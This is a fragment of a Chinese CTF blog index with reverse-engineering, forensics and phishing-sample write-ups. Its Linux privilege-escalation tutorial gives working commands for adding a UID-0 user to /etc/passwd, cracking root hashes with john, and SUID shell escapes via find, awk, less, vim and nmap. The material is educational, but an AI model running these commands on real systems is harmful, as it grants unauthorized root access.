-    <title>Reverse Record</title>
-    <url>/2024/11/Reverse-Record/</url>
-    <content><![CDATA[<h1 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h1><h3 id="pyc反编译"><a href="#pyc反编译" class="headerlink" title="pyc反编译"></a>pyc反编译</h3><blockquote>
-<p><code>.pyc</code> 是 Python 编译后的字节码文件，通常是在运行 Python 脚本时由解释器自动生成，用于加速程序运行</p>
-<p>想查看 <code>.pyc</code> 文件的源码，可以使用反编译工具 uncompyle6 将其还原为 <code>.py</code> 文件。</p>
-</blockquote>
-<p>-使用 uncompyle6</p>
-<p>-在线网站 <a href="https://tool.lu/pyc/">https://tool.lu/pyc/</a></p>
-<h3 id="exe反编译"><a href="#exe反编译" class="headerlink" title="exe反编译"></a>exe反编译</h3><p>使用IDA</p>
-<h3 id="apk反编译"><a href="#apk反编译" class="headerlink" title="apk反编译"></a>apk反编译</h3><p>使用jadx-gui-1.4.4-no-jre-win.exe</p>
-<h1 id="NewStar-re复现"><a href="#NewStar-re复现" class="headerlink" title="NewStar-re复现"></a><strong>NewStar-re复现</strong></h1><p><strong>学MISC果然还是要带点其他领域，那就学点RE吧！而RE的入门还是觉得NewStar好，不会了还有WP看（bushi</strong></p>
-<h2 id="1-ez-debug"><a href="#1-ez-debug" class="headerlink" title="1.ez_debug"></a><em>1.ez_debug</em></h2><p>当初不会写是因为这个代码风格我有点看不懂，而且很长加上不怎么会调试所以没写出来。</p>
-<p><img src="re2.png" alt="re2"></p>
-<p>这里我们应该发现decrypted flag应该是输入的flag与加密之后再解密的flag比较<br>注意上面的you函数，步入后看到几个变量，下断点，调试</p>
-<p><img src="re3.png" alt="re3"></p>
-<p>能看得到v5的值在缓慢变化成flag，不断f8单步执行即得到flag</p>
-<p>总结:看到提示后应该多步入函数看看，断点也可以下在函数里。F8单步执行可以缓慢查看变量的变化。</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
         <tag>CTF</tag>
-        <tag>reverse</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>18届软件创新攻防赛部分wp</title>
-    <url>/2025/01/18%E5%B1%8A%E8%BD%AF%E4%BB%B6%E5%88%9B%E6%96%B0%E6%94%BB%E9%98%B2%E8%B5%9B%E9%83%A8%E5%88%86wp/</url>
-    <content><![CDATA[<h1 id="1-钓鱼邮件"><a href="#1-钓鱼邮件" class="headerlink" title="1.钓鱼邮件"></a>1.钓鱼邮件</h1><p>拿到一个eml，可以用qq邮箱给自己写信，然后附件带上这个eml，之后自己就能收到这个邮件，预览一下可以看到：</p>
-<img src="屏幕截图 2025-01-05 183618.png" alt="屏幕截图 2025-01-05 183618" style="zoom:75%;">
-
-<p>发现有一个<code>生日礼物.zip</code>，点击下载</p>
-<p>下载得到的zip发现有密码，使用arp爆破一下得到密码：20001111</p>
-<img src="屏幕截图 2025-01-05 183758.png" alt="屏幕截图 2025-01-05 183758" style="zoom: 50%;">
-
-<p>然后发现一个exe，双击运行。</p>
-<p>然后使用火绒剑，监控网络，就能发现这个 生日礼物.exe</p>
-<p>因为会实时变化，记得要截图看会好看一点。</p>
-<img src="屏幕截图 2025-01-05 184101.png" alt="屏幕截图 2025-01-05 184101" style="zoom:75%;">
-
-<p>放大就能看到这个远程地址 222.218.218.218:55555</p>
-<img src="屏幕截图 2025-01-05 184221.png" alt="屏幕截图 2025-01-05 184221" style="zoom:75%;">
-
-<p>包上md5得到flag：df3101212c55ea8c417ad799cfc6b509</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>WP</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>misc</tag>
-        <tag>WP</tag>
       </tags>
   </entry>
   <entry>
     <title>VNCTF2025misc复现</title>
     <url>/2025/02/VNCTF2025misc%E5%A4%8D%E7%8E%B0/</url>
     <content><![CDATA[]]></content>
-  </entry>
-  <entry>
-    <title>Linux提权浅析</title>
-    <url>/2025/01/Linux%E6%8F%90%E6%9D%83%E6%B5%85%E6%9E%90/</url>
-    <content><![CDATA[<h1 id="passwd提权"><a href="#passwd提权" class="headerlink" title="passwd提权"></a>passwd提权</h1><p><code>/etc/passwd</code>和 <code>/etc/shadow</code>文件是 Linux 系统登录认证的关键文件，如果系统运维人员对 <code>passwd</code>或 <code>shadow</code>文件的内容或权限配置有误，则可以被利用来进行系统提权。</p>
-<p>我们先了解一下 <code>/etc/passwd</code>内容的含义：</p>
-<p>Linux 密码信息保存在两个文件中，分别为：<code>/etc/passwd</code>和 <code>/etc/shadow</code></p>
-<p><code>/etc/passwd</code>文件用于保存用户信息，<strong>每一行代表一个用户</strong>，每一行通过冒号 <code>:</code>分为七个部分:</p>
-<ol>
-<li>用户名</li>
-<li>密码，若为 <code>x</code>则表示密码保存在<code>/etc/shadow</code></li>
-<li>UID，0 代表 root</li>
-<li>GID，表示所在组</li>
-<li>描述信息，依次为 Full Name、Room Number、Work Phone、Home Phone 和 Other</li>
-<li>用户主目录</li>
-<li>默认 shell 类型</li>
-</ol>
-<p>例如，假设 <code>/etc/passwd</code>文件中其中一行信息如下：</p>
-<p><img src="1607657766_5fd2e926952afffe8e697.png" alt="1607657766_5fd2e926952afffe8e697"></p>
-<p>其含义解读如下：</p>
-<p>​	*用户名：test-user</p>
-<p>​	*密码保存在 <code>/etc/shadow</code>中</p>
-<p>​	*UID 为 1001</p>
-<p>​	*GID 为 1001</p>
-<p>​	*描述信息： Full Name [test]: Room Number [11111]: Work Phone [111111-11]: Home Phone [222222-22]: Other [test]</p>
-<p>​	*用户主目录为 <code>/home/test-user</code></p>
-<p>​	*默认 shell 为 <code>/bin/bash</code></p>
-<p>因此在登陆时候的权限是通过第三个字段 <code>UID</code>和第四个字段 <code>GID</code>确定。其中 <code>UID=0</code>代表 root 用户</p>
-<p><strong>如果我们能够对 <code>/etc/passwd</code>文件内容进行伪造、篡改，那就能很轻易的登录成功并获取任意用户权限。</strong></p>
-<p>所以，获取passwd的写入权限十分重要</p>
-<p>通常来说，通过 <code>/etc/passwd</code>提权的方法有两种：</p>
-<ol>
-<li>如果具有 <code>/etc/passwd</code>的 <strong>w</strong> (写入) 权限，可以直接添加一个 root 权限的用户</li>
-<li>如果 <code>/etc/passwd</code>中存储 root 用户密码哈希，可以使用 john 进行破解</li>
-</ol>
-<h3 id="场景一：-etc-passwd-具有写权限"><a href="#场景一：-etc-passwd-具有写权限" class="headerlink" title="场景一：&#x2F;etc&#x2F;passwd 具有写权限"></a>场景一：&#x2F;etc&#x2F;passwd 具有写权限</h3><p>查看</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -alh /etc/passwd /etc/shadow</span><br></pre></td></tr></table></figure>
-
-<p>如果有 <code>--wx--xrwx</code> 意味着我们具有写入权限，接下来我们需要做的就是</p>
-<p><strong>自己构造一行用户数据添加到 passwd 文件中，用户名和密码自定义，并且将 <code>UID</code>设置为 <code>0</code>，此时我们登陆就可以获取 root 权限。</strong></p>
-<p>查看 passwd 文件中 root 用户数据的格式</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd|grep root</span><br></pre></td></tr></table></figure>
-
-<p>结果</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>
-
-<p>先设置用户名，如syl-passwd</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">syl-passwd:x:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>
-
-<p>设置密码，由于密码并不是明文而是经过 hash 算法加密之后的密文字符串，我们使用 <code>openssl</code>套件</p>
-<p>使用 <code>openssl</code>创建一个密码为 pass123 的 linux hash，命令如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl passwd -1 -salt ignite pass123</span><br><span class="line">#-1 ：使用 MD5 hash 算法</span><br><span class="line">#-salt ：对 hash 算法加 &quot;盐&quot;</span><br></pre></td></tr></table></figure>
-
-<p>计算得到密码$1$ignite$3eTbJm98O9Hz.k1NTdNxe1，接着构造：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">syl-passwd:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>
-
-<p>添加到passwd</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;syl-passwd:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash&#x27; &gt;&gt; /etc/passwd</span><br><span class="line">#必须使用单引号，不能使用双引号</span><br><span class="line">#使用 &gt;&gt;，而不是 &gt;</span><br></pre></td></tr></table></figure>
-
-<p>这样即添加成功，也可以再次查看一下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd|grep syl-passwd</span><br></pre></td></tr></table></figure>
-
-<p>接下来su syl-passwd切换到 syl-passwd 用户，密码为 pass123即可拿到权限</p>
-<h3 id="场景二：-etc-passwd-存储用户密码-hash"><a href="#场景二：-etc-passwd-存储用户密码-hash" class="headerlink" title="场景二：&#x2F;etc&#x2F;passwd 存储用户密码 hash"></a>场景二：&#x2F;etc&#x2F;passwd 存储用户密码 hash</h3><p>一样查看读写权限</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -alh /etc/passwd /etc/shadow</span><br></pre></td></tr></table></figure>
-
-<p>但是发现权限配置都是正确的，普通用户只具有 <code>/etc/passwd</code>文件的<strong>读</strong>权限。</p>
-<p>接下来查看 <code>/etc/passwd</code>文件的内容：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure>
-
-<p>结果发现</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root:$1$ignite$J98A8EVPG1O40.WnwrPEM1:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>
-
-<p>中间的$1$ignite$J98A8EVPG1O40.WnwrPEM1即是root的密码哈希值，接下来所做的就是john了</p>
-<p>先将之前获取到的 root 用户 hash 写入文件 hash.txt 中：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;root:$1$ignite$J98A8EVPG1O40.WnwrPEM1:0:0:root:/root:/bin/bash&#x27; &gt; ~/hash.txt</span><br><span class="line"># 此处必须单引号</span><br></pre></td></tr></table></figure>
-
-<p>然后就john：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">john ~/hash.txt</span><br></pre></td></tr></table></figure>
-
-<p>最后得到密码是hello</p>
-<p>接下来就一样了，su root，提权。</p>
-<h1 id="shadow提权"><a href="#shadow提权" class="headerlink" title="shadow提权"></a>shadow提权</h1><p>shadow提权与passwd类似</p>
-<p>都是获取root密码的哈希值然后进行爆破</p>
-<h1 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h1><p><strong>什么是suid提权？</strong></p>
-<p>SUID是Linux的一种权限机制，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。所以利用suid提权的核心就是运行root用户所拥有的suid的文件，那么运行该文件的时候就得获得root用户的身份了。</p>
-<p>suid特点是用户运行某个程序时，如果该程序有suid权限，程序运行进程的属主不是发起者，而是程序文件所属的属主。</p>
-<p>linux引入了3个文件来管理用户组：</p>
-<ol>
-<li>&#x2F;etc&#x2F;passwd存放用户信息。</li>
-<li>&#x2F;etc&#x2F;shadow存放用户密码信息。</li>
-<li>&#x2F;etc&#x2F;group存放组信息</li>
-</ol>
-<p>利用原理：在执行过程中，调用者会暂时获得该文件的所有者权限，且该权限只在程序执行的过程中有效。假设可执行文件binexec其属主为root，当以非root身份登录时，如binexec设置了suid权限，就可以在非root身份下运行该可执行文件，可执行文件运行时该进程的权限为root权限。</p>
-<h2 id="如何设置suid"><a href="#如何设置suid" class="headerlink" title="如何设置suid"></a>如何设置suid</h2><p>列出所有文件：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -al</span><br></pre></td></tr></table></figure>
-
-<p>设置suid：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod u+s filename #设置suid</span><br><span class="line">chmod u-s filename #去除suid</span><br></pre></td></tr></table></figure>
-
-<p>如果文件从<code>-rw</code>变成了<code>-rwS</code>说明添加上了suid权限</p>
-<p>注意：</p>
-<ul>
-<li>只有可以执行的二进制程序文件才能设定SUID权限,非二进制文件设置SUID权限没任何意义</li>
-<li>命令执行者要对该程序文件拥有执行(x)权限才能使用</li>
-<li>SUID权限只在该程序执行过程中有效,也就是说身份改变只在程序执行过程中有效</li>
-</ul>
-<p>具有suid权限的二进制可执行文件有：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap</span><br><span class="line">vim</span><br><span class="line">find</span><br><span class="line">bash</span><br><span class="line">more</span><br><span class="line">less</span><br><span class="line">nano</span><br><span class="line">cp</span><br><span class="line">awk</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="如何查找"><a href="#如何查找" class="headerlink" title="如何查找"></a>如何查找</h2><p>查找系统上运行的suid文件，且查找具有root权限的</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># /表示从文件系统的顶部（根）开始并找到每个目录</span><br><span class="line"># -perm 表示搜索随后的权限</span><br><span class="line"># -u = s表示查找root用户拥有的文件</span><br><span class="line"># -type表示我们正在寻找的文件类型</span><br><span class="line"># f 表示常规文件，而不是目录或特殊文件</span><br><span class="line"># 2表示该进程的第二个文件描述符，即stderr（标准错误）</span><br><span class="line"># &gt;表示重定向</span><br><span class="line"># /dev/null是一个特殊的文件系统对象，它将丢弃写入其中的所有内容。</span><br></pre></td></tr></table></figure>
-
-<p>查找如下：</p>
-<img src="屏幕截图 2025-01-27 160340.png" alt="屏幕截图 2025-01-27 160340" style="zoom:80%;">
-
-<p>ls一下看看是否设置了suid权限</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -al /usr/bin/su</span><br><span class="line">#查看/usr/bin/su有无suid权限</span><br></pre></td></tr></table></figure>
-
-<p>如果看到确实设置了suid权限，而且属主为root，现在我们就可以利用我们之前提到的suid可执行二进制文件从而进行提权。</p>
-<h2 id="进行提权"><a href="#进行提权" class="headerlink" title="进行提权"></a>进行提权</h2><p><strong>这里的前提都是要有suid权限</strong></p>
-<p>如果之前查找到的<code>usr/bin/find</code>具有root权限，就用find命令进行提权</p>
-<h3 id="find"><a href="#find" class="headerlink" title="find"></a>find</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find filename -exec whoami \; -quit</span><br><span class="line"># root</span><br><span class="line">find filename -exec /bin/sh -p \; -quit</span><br><span class="line"># whoami</span><br><span class="line"># root</span><br><span class="line"></span><br><span class="line"># 这里的filename对应的文件要有suid权限，比如之前看到/usr/bin/su有suid权限这里就是/usr/bin/su</span><br></pre></td></tr></table></figure>
-
-<p>还有一种差不多的提权方法</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#先前利用以上查找suid文件查询到了/usr/bin/find 有suid权限</span><br><span class="line">touch 1.txt #创建1.txt</span><br><span class="line">/usr/bin/find 1.txt -exec whoami \;</span><br></pre></td></tr></table></figure>
-
-<p>好像也可以：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find /etc/passwd -exec /bin/bash -p \;</span><br></pre></td></tr></table></figure>
-
-<p>如果最后出了个<code>root</code>就说明提权成功了</p>
-<p>同理，不只find命令，有很多赋予suid权限的文件可以达到权限提升的效果(实际上也和rbash逃逸、sudo提权那些获取shell的命令相似)，这里列举几个：</p>
-<table>
-<thead>
-<tr>
-<th align="left">suid文件</th>
-<th align="left">提权命令</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">&#x2F;usr&#x2F;bin&#x2F;bash</td>
-<td align="left">bash -p</td>
-</tr>
-<tr>
-<td align="left">&#x2F;usr&#x2F;bin&#x2F;csh</td>
-<td align="left">csh -b</td>
-</tr>
-<tr>
-<td align="left">&#x2F;usr&#x2F;bin&#x2F;sh</td>
-<td align="left">sh -p</td>
-</tr>
-<tr>
-<td align="left">&#x2F;usr&#x2F;bin&#x2F;ksh</td>
-<td align="left">ksh -p</td>
-</tr>
-<tr>
-<td align="left">&#x2F;usr&#x2F;bin&#x2F;zsh</td>
-<td align="left">zsh</td>
-</tr>
-<tr>
-<td align="left">&#x2F;usr&#x2F;bin&#x2F;find</td>
-<td align="left">find &#x2F;etc&#x2F;passwd -exec &#x2F;bin&#x2F;bash -p ;</td>
-</tr>
-<tr>
-<td align="left">&#x2F;usr&#x2F;bin&#x2F;awk</td>
-<td align="left">awk ‘BEGIN {system(“&#x2F;bin&#x2F;bash”)}’</td>
-</tr>
-<tr>
-<td align="left">&#x2F;usr&#x2F;bin&#x2F;man</td>
-<td align="left">!&#x2F;bin&#x2F;bash</td>
-</tr>
-<tr>
-<td align="left">&#x2F;usr&#x2F;bin&#x2F;more</td>
-<td align="left">!&#x2F;bin&#x2F;bash</td>
-</tr>
-</tbody></table>
-<p><strong>利用相关命令均可在这个网站上查询</strong>：<a href="https://gtfobins.github.io/">GTFOBins</a></p>
-<h3 id="namp"><a href="#namp" class="headerlink" title="namp"></a>namp</h3><p>适用版本：nmap2.02至5.21。</p>
-<p>nmap是一个经典的端口扫描工具，当目标主机存在版本在2.02-5.21之间的nmap且os的版本在上面受影响的范围内或更早就可以尝试使用这种方法进行提权。</p>
-<p>首先是进入nmap交互模式</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap --interactive</span><br></pre></td></tr></table></figure>
-
-<p>之后利用命令进行提权</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap&gt; !sh</span><br><span class="line"></span><br><span class="line">sh-3.2# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="less-more"><a href="#less-more" class="headerlink" title="less&#x2F;more"></a>less&#x2F;more</h3><p>使用more和less一定读取一个比较大的文件，如果文件太小无法进入翻页功能，无法使用<code>!</code>命令进入shell。</p>
-<p>less与more相似，以less为例</p>
-<p>less是一种查看文件的命令，但是我们也可以利用less进行执行我们的shell命令</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">less /etc/passwd</span><br></pre></td></tr></table></figure>
-
-<p>之后进入交互界面，输入</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">VISUAL=&quot;/bin/sh -c &#x27;/bin/sh&#x27;&quot; less /etc/profile</span><br><span class="line">v</span><br><span class="line"></span><br><span class="line">less /etc/profile</span><br><span class="line">v:shell</span><br></pre></td></tr></table></figure>
-
-<p>就可以进入交互界面然后写入shell的</p>
-<h3 id="nano"><a href="#nano" class="headerlink" title="nano"></a>nano</h3><p>nano进入shell页面似乎比较简单</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nano</span><br><span class="line">ctrl + R</span><br><span class="line">ctrl + X</span><br><span class="line">#shell</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="cp-mv"><a href="#cp-mv" class="headerlink" title="cp&#x2F;mv"></a>cp&#x2F;mv</h3><p>以cp为例</p>
-<p>主要是利用cp命令覆盖&#x2F;etc&#x2F;passwd从而进行提权</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami</span><br><span class="line">#qszd</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl passwd -1 -salt test testaaa</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;test:$1$test$giCVmzusADSPMon2mwEWo1:0:0::/root/:/bin/sh&#x27; &gt;&gt; passwd</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su - test</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="vi-vim"><a href="#vi-vim" class="headerlink" title="vi&#x2F;vim"></a>vi&#x2F;vim</h3><p>vim为例</p>
-<p>首先是一种比较特殊的情况，就是vim被配置了suid权限，所以只有root才能有权限进行读写，这种时候就是</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim.tiny /etc/passwd</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">:!/bin/sh</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h1 id="其他提权"><a href="#其他提权" class="headerlink" title="其他提权"></a>其他提权</h1><h2 id="通过查询历史记录从而获得信息泄露的信息"><a href="#通过查询历史记录从而获得信息泄露的信息" class="headerlink" title="通过查询历史记录从而获得信息泄露的信息"></a>通过查询历史记录从而获得信息泄露的信息</h2><p>利用以下命令可以获取</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat ~/.bash_history</span><br></pre></td></tr></table></figure>
-
-<p>这个命令可以查看当前用户使用过的历史命令</p>
-<p>有可能会得到root登录的密码</p>
-]]></content>
-      <tags>
-        <tag>CTF</tag>
-        <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>newstar2024小明同学们复现</title>
-    <url>/2024/12/newstar2024%E5%B0%8F%E6%98%8E%E5%90%8C%E5%AD%A6%E4%BB%AC%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<p>主要最近发现自己的取证题目比较薄弱，于是拿小明同学们练练手。</p>
-<h1 id="1-热心助人的小明同学"><a href="#1-热心助人的小明同学" class="headerlink" title="1.热心助人的小明同学"></a><u>1.热心助人的小明同学</u></h1><p>这个很简单，只要装好vol2，然后lsadump看密码就好</p>
-<p>先看操作版本</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vol.py -f image.raw imageinfo</span><br></pre></td></tr></table></figure>
-
-<img src="屏幕截图 2024-12-20 140254.png" alt="屏幕截图 2024-12-20 140254" style="zoom:67%;">
-
-<p>看到操作版本是 Win7SP1x86_23418</p>
-<p>然后直接lsadump就好</p>
-<img src="屏幕截图 2024-12-20 140511.png" alt="屏幕截图 2024-12-20 140511" style="zoom:75%;">
-
-<p>密码：ZDFyVDlfdTNlUl9wNHNTdzByRF9IQUNLRVIh（开头的0x48不是密码）</p>
-<p>所以flag：flag{ZDFyVDlfdTNlUl9wNHNTdzByRF9IQUNLRVIh}</p>
-<h1 id="2-擅长音游的小明同学"><a href="#2-擅长音游的小明同学" class="headerlink" title="2.擅长音游的小明同学"></a><u>2.擅长音游的小明同学</u></h1><p>拿到一个chal_fixed.E01文件，使用FTK挂载 （最好用4.2版本的</p>
-<p>在win7那个下面的<code>root/users/desktop</code>可以看到</p>
-<img src="屏幕截图 2025-01-04 210938.png" alt="屏幕截图 2025-01-04 210938" style="zoom:75%;">
-
-<blockquote>
-<p>[!NOTE]</p>
-<p>真相.txt</p>
-<p>真相会不经意间流入日常的点点滴滴……<br>真相在哪里?</p>
-</blockquote>
-<blockquote>
-<p>[!NOTE]</p>
-<p>要开始了呦.txt</p>
-<p>今天舞萌彩框了好开心啊o(<em>￣▽￣</em>)ブ<br>我要把这一刻用照片保存下来<br>不过在拍摄rating变化的瞬间总感觉有什么东西藏进照片里了<br>打开也没发现什么异常，但是体积好像变大了一点<br>是错觉吗？</p>
-</blockquote>
-<p>可以发现跟图片有关，而在照片文件里面找到ColorfulDog.jpg</p>
-<img src="屏幕截图 2025-01-04 211404.png" alt="屏幕截图 2025-01-04 211404" style="zoom:75%;">
-
-<p>没啥思路了binwalk一下（感觉挺正常的</p>
-<p>发现一个txt内容是：</p>
-<p>听好了听好了听好了听好了听好了听好了听好了： 1919年8月10日，世界就此陷落， 陷落的世界都将迎来一场漩涡， 为这个世界带来有关弗拉格尚未知晓的真相。 但发掘真相的道路被加诸混沌的历练 世界的宽高未被正确丈量 当真相被混沌打乱时 真相将不复存在 也许，在世界的重置和轮回中能找到发现真相的方法…… 至此，尘埃落定 至此，一锤定音 #音游# #NewStarcaea# #Misc#</p>
-<p>然后我们挂载这个E01，注意要在FTK上右键加载镜像，进行加载</p>
-<img src="屏幕截图 2025-01-05 132008.png" alt="屏幕截图 2025-01-05 132008" style="zoom:75%;">
-
-<p>使用VM挂载一下，注意要用管理员运行。</p>
-<p>这里要选择UEFI</p>
-<img src="屏幕截图 2025-01-05 132348.png" alt="屏幕截图 2025-01-05 132348" style="zoom:75%;">
-
-<p>挂载出问题了。。。</p>
-<h1 id="3-擅长加密的小明同学"><a href="#3-擅长加密的小明同学" class="headerlink" title="3.擅长加密的小明同学"></a><u>3.擅长加密的小明同学</u></h1><p>拿到了一个vhd和一个君は加密本当に上手だな.zip，解压得到一个raw文件</p>
-<p>vhd双击打开发现要BitLocker解密，我们使用Elcomsoft Forensic Disk Decryptor</p>
-<p>选择<code>decrypt or mount disk / image file of disk\partition</code></p>
-<img src="屏幕截图 2025-01-05 144711.png" alt="屏幕截图 2025-01-05 144711" style="zoom:50%;">
-
-<p>进行恢复，得到key：408320-285065-614779-610940-547107-218229-492195-125422</p>
-<p>输入恢复密钥之后得到了一个flag.7z，解压需要密码。</p>
-<p>7z在密码复杂的情况下几乎不可能被爆破出来，所以我们看raw文件。</p>
-<p>查看操作版本</p>
-<img src="屏幕截图 2025-01-28 161649.png" alt="屏幕截图 2025-01-28 161649" style="zoom:80%;">
-
-<p>查看有什么进程</p>
-<img src="屏幕截图 2025-01-28 161823.png" alt="屏幕截图 2025-01-28 161823" style="zoom:80%;">
-
-<p>看到有一个mspaint.exe（画图进程），我们提取出来，使用 memdump：</p>
-<img src="屏幕截图 2025-01-28 162129.png" alt="屏幕截图 2025-01-28 162129" style="zoom:80%;">
-
-<p>然后改后缀为data，拉入GIMP.</p>
-<p>图像类型选择RGB透明，拉X,Y,Z，最后得到：</p>
-<img src="屏幕截图 2025-01-28 162730.png" alt="屏幕截图 2025-01-28 162730" style="zoom:80%;">
-
-<p>压缩包密码：<code>rxnifbeiyomezpplugho</code></p>
-<p>解压出来得到：flag{5ZCb44Gv5Y+W6K+B5pys5b2T44Gr5LiK5omL}</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>WP</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>misc</tag>
-        <tag>WP</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>wsl启动出错</title>
-    <url>/2024/12/wsl%E5%90%AF%E5%8A%A8%E5%87%BA%E9%94%99/</url>
-    <content><![CDATA[<h1 id="wsl启动出错"><a href="#wsl启动出错" class="headerlink" title="wsl启动出错"></a>wsl启动出错</h1><p><strong>启动出错如下：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">由于未安装所需的特性，无法启动操作。</span><br><span class="line">错误代码: Wsl/Service/CreateInstance/CreateVm/HCS/HCS_E_SERVICE_NOT_AVAILABLE</span><br><span class="line">Press any key to continue...</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="1-启用了-WSL-所需的功能"><a href="#1-启用了-WSL-所需的功能" class="headerlink" title="1.启用了 WSL 所需的功能"></a>1.启用了 WSL 所需的功能</h2><p>可以以管理员身份在powershell输入以下命令：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart</span><br><span class="line">dism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart</span><br></pre></td></tr></table></figure>
-
-<p>然后重启电脑，看wsl还能运行吗</p>
-<p>我是运行了这个就好了，界面：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32&gt;dism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart</span><br><span class="line"></span><br><span class="line">部署映像服务和管理工具</span><br><span class="line">版本: 10.0.26100.1150</span><br><span class="line"></span><br><span class="line">映像版本: 10.0.26100.2454</span><br><span class="line"></span><br><span class="line">启用一个或多个功能</span><br><span class="line">[==========================100.0%==========================]</span><br><span class="line">操作成功完成。</span><br><span class="line"></span><br><span class="line">C:\Windows\System32&gt;dism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart</span><br><span class="line"></span><br><span class="line">部署映像服务和管理工具</span><br><span class="line">版本: 10.0.26100.1150</span><br><span class="line"></span><br><span class="line">映像版本: 10.0.26100.2454</span><br><span class="line"></span><br><span class="line">启用一个或多个功能</span><br><span class="line">[==========================100.0%==========================]</span><br><span class="line">操作成功完成。</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="2-更新-WSL-核心"><a href="#2-更新-WSL-核心" class="headerlink" title="2.更新 WSL 核心"></a>2.更新 WSL 核心</h2><p>WSL 需要最新版本的核心来支持虚拟机实例。更新核心：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wsl --update</span><br></pre></td></tr></table></figure>
-
-<p>运行后检查版本</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wsl --version</span><br></pre></td></tr></table></figure>
-
-
-
